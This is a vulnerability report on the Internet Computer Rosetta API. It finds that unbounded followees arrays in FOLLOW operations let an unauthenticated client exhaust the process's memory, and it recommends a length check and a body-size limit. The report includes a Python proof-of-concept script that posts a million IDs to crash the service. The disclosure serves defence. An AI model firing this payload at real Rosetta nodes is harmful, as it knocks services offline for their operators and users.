### Title
Unbounded `followees` Vec in FOLLOW operation causes heap exhaustion in Rosetta process — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

An unprivileged HTTP client can POST a `/construction/payloads` request with a FOLLOW operation whose `followees` array contains an arbitrarily large number of neuron IDs. The Rosetta process allocates a `Vec<NeuronId>` proportional to the attacker-controlled length with no bounds check, exhausting heap memory and crashing the process before the request ever reaches the governance canister.

---

### Finding Description

In `construction_payloads.rs`, the `handle_follow` function unconditionally maps the entire `followees` collection to a new `Vec<NeuronId>`: [1](#0-0) 

```rust
let neuron_ids = req
    .followees
    .iter()
    .map(|id| NeuronId { id: *id })
    .collect();
let command = ManageNeuronCommandRequest::Follow(manage_neuron::Follow {
    topic,
    followees: neuron_ids,
});
```

There is no length guard before the `.collect()`. The `Follow` struct's `followees` field is a plain `Vec<u64>` (confirmed by the dereference `*id` mapping to `NeuronId { id: *id }`), and no upstream validation caps its length. [2](#0-1) 

The entry point is the public `construction_payloads` handler, which calls `convert::operations_to_requests` and then dispatches to `handle_follow` with no size check on the parsed operations: [3](#0-2) 

No HTTP body size limit was found in the Rosetta server configuration for this path.

---

### Impact Explanation

The Rosetta process is an off-chain Rust binary. A single POST with `followees` containing ~10^7 u64 values (~80 MB JSON payload) forces two sequential heap allocations — one during JSON deserialization into `Vec<u64>` and one during `.collect()` into `Vec<NeuronId>` — totalling hundreds of MB. Repeated or concurrent requests can exhaust available memory and crash the process. No authentication is required; the endpoint is publicly reachable.

Impact: **DoS of the Rosetta API service** (process crash, service unavailability). Scoped as a non-volumetric single-replica crash of the Rosetta node.

---

### Likelihood Explanation

The attack requires only an HTTP POST with a large JSON array — no credentials, no prior state, no privileged access. The payload for 10^6 elements is ~10 MB, well within typical HTTP client capabilities. The missing guard is a single missing length check.

---

### Recommendation

Add a maximum followee count check before the `.collect()` in `handle_follow`:

```rust
const MAX_FOLLOWEES: usize = 100; // governance enforces ≤15 per topic anyway
if req.followees.len() > MAX_FOLLOWEES {
    return Err(ApiError::invalid_request(
        "Too many followees in FOLLOW operation",
    ));
}
```

Additionally, configure an HTTP request body size limit in the Rosetta server (e.g., via `axum`'s `DefaultBodyLimit` layer).

---

### Proof of Concept

```python
import requests, json

# 1_000_000 followee IDs — ~10 MB JSON body
followees = list(range(1_000_000))

payload = {
    "network_identifier": {"blockchain": "Internet Computer", "network": "00000000000000020101"},
    "operations": [{
        "operation_identifier": {"index": 0},
        "type": "FOLLOW",
        "account": {"address": "<valid_account>"},
        "metadata": {
            "neuron_index": 0,
            "followees": followees,
            "topic": 1
        }
    }],
    "public_keys": [{"hex_bytes": "<valid_pk>", "curve_type": "edwards25519"}]
}

r = requests.post("http://<rosetta-host>:8080/construction/payloads",
                  json=payload, timeout=120)
# Rosetta process OOMs and crashes; subsequent requests return connection refused
``` [4](#0-3)

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L239-245)
```rust
                Request::Follow(req) => handle_follow(
                    req,
                    &mut payloads,
                    &mut updates,
                    &pks_map,
                    &ingress_expiries,
                )?,
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L917-952)
```rust
fn handle_follow(
    req: Follow,
    payloads: &mut Vec<SigningPayload>,
    updates: &mut Vec<(RequestType, HttpCanisterUpdate)>,
    pks_map: &HashMap<icp_ledger::AccountIdentifier, &PublicKey>,
    ingress_expiries: &[u64],
) -> Result<(), ApiError> {
    let account = req.account;
    let topic = req.topic;
    let controller = req.controller;
    let neuron_index = req.neuron_index;
    let neuron_ids = req
        .followees
        .iter()
        .map(|id| NeuronId { id: *id })
        .collect();
    let command = ManageNeuronCommandRequest::Follow(manage_neuron::Follow {
        topic,
        followees: neuron_ids,
    });
    add_neuron_management_payload(
        RequestType::Follow {
            neuron_index,
            controller: controller.map(PublicKeyOrPrincipal::Principal),
        },
        account,
        controller,
        neuron_index,
        command,
        payloads,
        updates,
        pks_map,
        ingress_expiries,
    )?;
    Ok(())
}
```
